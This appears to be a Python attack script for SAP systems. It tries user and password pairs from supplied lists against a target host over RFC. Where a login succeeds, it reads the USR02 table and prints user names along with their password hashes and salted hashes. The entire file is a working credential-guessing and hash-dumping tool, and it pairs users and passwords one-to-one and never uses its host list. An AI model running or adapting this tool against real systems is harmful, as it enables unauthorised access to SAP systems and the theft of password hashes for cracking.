from pyrfc import Connection
import argparse
import os

def read_file_or_value(path_or_value):
    if os.path.isfile(path_or_value):
        with open(path_or_value, 'r') as f:
            return f.read().splitlines()
    else:
        return [path_or_value]

def colored_output(text, color):
    colors = {
        "green": "\033[92m",
        "red": "\033[91m",
        "orange": "\033[93m",
        "end": "\033[0m"
    }
    return colors[color] + text + colors["end"]

def fetch_usr02_data(conn):
    table_name = 'USR02'
    fields = [
        {'FIELDNAME': 'BNAME'},        # User Name
        {'FIELDNAME': 'BCODE'},       # User Password Status
        {'FIELDNAME': 'USTYP'},       # User Type
        {'FIELDNAME': 'CLASS'},       # User Class
        {'FIELDNAME': 'PASSCODE'},    # Password Hash
        {'FIELDNAME': 'PWDSALTEDHASH'}# Salted Password Hash
    ]

    try:
        response = conn.call('RFC_READ_TABLE',
                             QUERY_TABLE=table_name,
                             DELIMITER=';',
                             FIELDS=fields)
        return response['DATA']

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def attempt_connection_and_read_table(user, passwd, host, clientnr, sysnr):
    try:
        conn = Connection(user=user, passwd=passwd, ashost=host, client=clientnr, sysnr=sysnr)
        usr02_data = fetch_usr02_data(conn)
        
        if usr02_data:
            print(colored_output(f"Successfull attempt for user {user} with password {passwd}","green"))
            for row in usr02_data:
                values = row['WA'].split(';')
                print(values)
        else:
            print(colored_output(f"Unsuccessful attempt for user {user} with password {passwd}","red"))

        conn.close()
    except Exception as e:
        print(colored_output(f"Unsuccessful attempt for user {user} with password {passwd} due to error:","red"), e)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Connect using pyrfc with specified parameters.")
    parser.add_argument('-u', '--user', required=True, help="Specify user or user file.")
    parser.add_argument('-p', '--passwd', required=True, help="Specify password or password file.")
    parser.add_argument('-ho', '--host', required=True, help="Specify target hostname/IP address.")
    parser.add_argument('-c', '--clientnr', default='001', help="Specify target client number. Default is 001.")
    parser.add_argument('-s', '--sysnr', default='00', help="Specify system number. Default is 00.")

    args = parser.parse_args()

    users = read_file_or_value(args.user)
    passwords = read_file_or_value(args.passwd)
    hosts = read_file_or_value(args.host)

    for user, passwd in zip(users, passwords):
        attempt_connection_and_read_table(user, passwd, args.host, args.clientnr, args.sysnr)
